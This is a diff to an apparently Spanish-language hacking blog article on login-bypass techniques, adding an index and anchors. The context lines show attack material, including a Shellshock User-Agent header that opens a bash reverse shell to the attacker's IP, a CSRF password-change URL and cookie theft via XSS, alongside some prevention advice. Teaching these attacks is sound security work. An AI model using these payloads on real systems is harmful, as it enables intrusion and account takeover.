@@ -22,6 +22,25 @@ En este artículo vamos a ver `distintas formas que hay para bypassear un login`
 
 ## ÍNDICE
 
+- [OSINT](#1)
+- [IDOR](#2)
+- [SQLi](#3)
+- [No SQLi](#4)
+- [HTML injection](#5)
+- [CSRF](#6)
+- [SHELL SHOCK](#7)
+- [PADDING ORACLE ATTACK](#8)
+- [BIT FLIPPER ATTACK](#9)
+- [PASSWORD SPRAYING](#10)
+- [SSTI](#11)
+- [CLICKJAKING](#12)
+- [BUFFER OVERFLOW](#13)
+- [TYPE JUGGLIN ATTACK](#14)
+- [DESERIALIZATION ATTACK](#15)
+- [XML XXE](#16)
+- [HTTP REQUEST SMUGGLING ATTACK](#17)
+- [PROTOTIPE POLLUTION](#18)
+
 ```
   - OSINT
   	·Técnicas básicas
@@ -52,6 +71,7 @@ En este artículo vamos a ver `distintas formas que hay para bypassear un login`
   - PROTOTIPE POLLUTION
 ```
 
+<a id="1"></a>
 # OSINT
 
 Puede parecer gracioso pero `no es raro encontrar credenciales validas en internet`. 
@@ -94,7 +114,7 @@ Listar los servidores de correo:
 > dig @{ip victima} {dominio web} mx
 ```
 
-
+<a id="2"></a>
 # IDOR
 
 Pongo esto como el primer método de bypassing, porque es mi favorito, es super gracioso, porque `es absurdo a mas no poder`. Y no es tan conocido, por ejemplo en bug bounty pasa una cosa bastante graciosa que es que la mayoría de personas buscan `XSS` o `SQLi`, pero se olvidan de esta vulnerabilidad tan graciosa. Y por otra parte, hace unos meses le esneñé esta vuln a un amigo que es programador de backend y se sorprendio porque no la conocia y es muy absurda. 
@@ -185,7 +205,7 @@ Y aquí esta lo gracioso y absurdo de este ataque. `Hemos conseguido acceso` a u
 
 Esta vulnerabilidad puede ocurrir cuando un servidor web recibe `input del usuario` para recuperar objetos (archivos, datos, documentos…). Si se pone mucha `confianza en los datos suministrados` en la petición, y `no se validan en la parte de servidor` para `confirmar que el objeto pertenece al usuario que lo pide`, puede darse una `IDOR`.
 
-
+<a id="3"></a>
 # SQLi
 
 ![](/assets/images/login-bypass/sql-injection.svg)
@@ -328,6 +348,7 @@ Aunque se podrían `sanear las entradas` usando métodos como `mysqli_real_escap
   5- No proporcionar mayor información de la necesaria.
 ```
 
+<a id="4"></a>
 # No SQLi
 
 Esto se basa en un concepto que hemos visto antes que era que si la respuesta era `algo o sino 1=1` se bypasseaba el login porque se cumplia lo de 1=1, pero esta vez tenemos que decir que `la contraseña es distinta a algo`, entonces `interpreta como valido` y bypassea el login.
@@ -357,6 +378,7 @@ luego `donde el user y password lo reemplazaremos por` lo siguiente:
 }
 ```
 
+<a id="5"></a>
 # COOKIE HIJACKING
 
 Antes de ver como robar cookies de otros usuarios para poder logearnos como ellos sin sus credenciales, debemos ver que es el HTML injection y el Cross Site Scripting (XSS).
@@ -410,6 +432,7 @@ Ahora escriviremos en un sitio donde sepamos que lo van a `ver otras personas` (
 
 Ahora la idea es que sin estar autenticado, con la extension de google `Edit this cookie` podremos `cambiarnos la cookie` por la que se nos muestre en el servidor http de la consola y pues se nos `cambiaria la sesión a la del propietario de la cookie capturada`.
 
+<a id="6"></a>
 # CSRF (Cross Site Request Forgery)
 
 Consiste en que cuando un usuario acceda a una web desde una `url` que mediante `ingenieria social` se le hace clicar, se apliquen `cambios para esa cuenta`. Es decir, que clicando en una url que le mandemos se le cambie la contraseña a la que nosotros queramos.
@@ -436,6 +459,7 @@ http://hacked.com/change_pass.php?password=hola123&confirm_password=hola123&subm
 
 Y cuando la víctima cae en la trampa el redirect pasa tan rápido que es imposible darse cuenta, aunque en algunas webs pone que la contraseña se ha cambiado.
 
+<a id="7"></a>
 # SHELL SHOCK
 
 Esto pasa cuando `la página de login` tiene el formato `(.cgi  ,  .pl  ,  .sh  ,  ...)`, entonces a traves del `user agent` podemos `ejecutar comandos` de forma remota. Claro, entonces con eso nos podemos mandar una `reverse shell`.
@@ -452,6 +476,7 @@ User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{mi ip}/{puerto} 0>&1
 
 Le damos a `Forward` y se supone que ganaríamos `acceso al sistema`, si no funciona, lo intentaríamos un par de veces más, por si acaso, y si sigue sin funcionar pues a mirar 	que emos hecho mal.
 
+<a id="8"></a>
 # PADDING ORACLE ATTACK con PADDBUSTER
 
 Esto basicamente es la explotación de un algoritmo de encriptacion (`cifrado cvc`). Consiste en que un texto claro lo separa en `bloques` para `encriptarlos individualmente`, por lo tanto tendremos que`saber el numero de bloques` para poder desencriptarlos, juntarlos y tener el texto. `Si no sabemos el numero de bloques` podemos probar uno a uno a `fuerza bruta`.
@@ -474,6 +499,7 @@ Con esto hacemos un `cookie hijacking` entonces pegamos la cookie que nos haya d
 
 ES IMPORTANTE ACLARAR QUE `PADBUSTER TARDA MUCHO` asi que aprobecha a merendar, echarte la siesta o hacer cualquier cosa XD
 
+<a id="9"></a>
 # BIT FLIPPER ATTACK para PADDING ORACLE ATTACK
 
 Una cosa rara que pasa en el `cifrado cvc` nos `registramos` con `{nombre de usuario existente}=` nos `logueariamos como ese usuario`, y si el usuario {nombre de usuario existente}= existe, tendríamos que `añadirle otro =` y si existe pues más de lo mismo, claro, así nos podríamos loguear como admins XD: `admin=`
@@ -494,6 +520,7 @@ En la nueva pestaña quenos ha abierto tendremos que ir mirando en la parte dond
 
 Si no nos deja podemos `hacer de nuevo la petición como bdmin` e interceptarla, luego `cambiamos la coockie` de esa peticion por la que habiamos conseguido de admin y le damos a `Forward`. Y listo, ya estaríamos logeados como admin. 
 
+<a id="10"></a>
 # PASSWORD SPRAYING
 
 Esto va a ser un poco copia pega del artículo que ya hice, pero bueno XD
@@ -563,6 +590,7 @@ Las formas de prevención de este ataque son bastante lógicas y son las mismas 
 
 ```
 
+<a id="11"></a>
 # SSTI (Server Side Template Injection)
 
 ![](/assets/images/login-bypass/ssti.webp)
@@ -620,6 +648,7 @@ Esta herramienta esta hecha `especificamente para esta vulnerabilidad`. Utiliza 
 
 - `Sandboxing:` En caso de que `el uso de caracteres riesgosos sea una necesidad empresarial`, se recomienda `utilizar un sandbox dentro de un entorno seguro`.
 
+<a id="12"></a>
 # CLICKJAKING
 
 Explicar esto me da mas pereza que explicar SQLi, porque la mayoría van a ser capturas de pantalla XD
@@ -660,7 +689,7 @@ También es importante saber que la web es una copia exacta de la original y va 
 
 ![](/assets/images/login-bypass/clickjaking-4.JPG)
 
-
+<a id="13"></a>
 # BUFFER OVERFLOW ATTACK
 
 ![](/assets/images/web-hacking/Buffer-overflow/buffer-overflow-attacks.png)
@@ -755,6 +784,7 @@ Claro, eso no se puede hacer siempre, porque puede suponer mucho trabajo rehacer
 
 ```
 
+<a id="14"></a>
 # TYPE JUGGLIN ATTACK
 Las vulnerabilidades `Type jugglin` (también conocidas como confusión de tipos) son una clase de vulnerabilidad en la que `un objeto se inicializa o se accede a él como el tipo incorrecto`, lo que permite a un atacante `eludir potencialmente la autenticación` o socavar la seguridad del tipo de una aplicación, lo que puede conducir a la ejecución de código arbitrario `Arbitrary code execution (ACE)`.
 
@@ -857,6 +887,7 @@ Lo primero que tenemos que hacer para prevenir esto es `testear` que los recurso
 
 Tambien hay que tener en cuenta que con lenguajes de programación estaticos tenemos que `tener mas cuidado con las conversiones de tipos de variables` y es recomendable `utilizar funciones lo mas estrictas posibles para evitar conversiones inesperadas`.
 
+<a id="15"></a>
 # DESERIALIZATION ATTACK with Node.js
 
 ![](/assets/images/login-bypass/deserialization.png)
@@ -963,6 +994,7 @@ Podemos hacer unas cuantas cosas para prevenir este tipo de ataques:
 ·Utilice técnicas de entrada de validación y sanitización: Asegúrese de validar y sanitizar todos los datos de entrada para evitar que los atacantes inyecten datos maliciosos en su aplicación.
 ```
 
+<a id="16"></a>
 # XML EXTERNAL ENTITY INJECTION (XXE)
 
 ![](/assets/images/login-bypass/XXE.png)
@@ -1153,6 +1185,7 @@ Hay varias formas de prevenirlo, es verdad que en cada lenguaje de programación
 · Limita las comunicaciones DNS
 ```
 
+<a id="17"></a>
 # HTTP REQUEST SMUGGLING ATTACK
 // notas para cuando haga esto, versiones vulnerables de nginx: 1.18.0 1.19.0
 https://medium.com/numen-cyber-labs/http-request-smuggling-how-to-detect-and-attack-c71f6c483e3d
